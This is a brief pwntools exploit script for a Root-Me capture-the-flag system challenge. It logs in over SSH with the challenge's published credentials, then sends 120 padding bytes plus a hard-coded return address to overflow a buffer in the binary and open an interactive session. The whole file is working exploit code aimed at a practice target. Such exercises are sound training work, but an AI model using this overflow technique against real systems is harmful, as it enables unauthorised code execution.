# pwning
from pwn import *
p = ssh(host='challenge02.root-me.org',user='app-systeme-ch15',password='app-systeme-ch15',port=2222)
print p['ls']
ch13=p.process('./ch15')

ch13.sendline('A'*120 + '\x64\x84\x04\x08')
ch13.interactive()
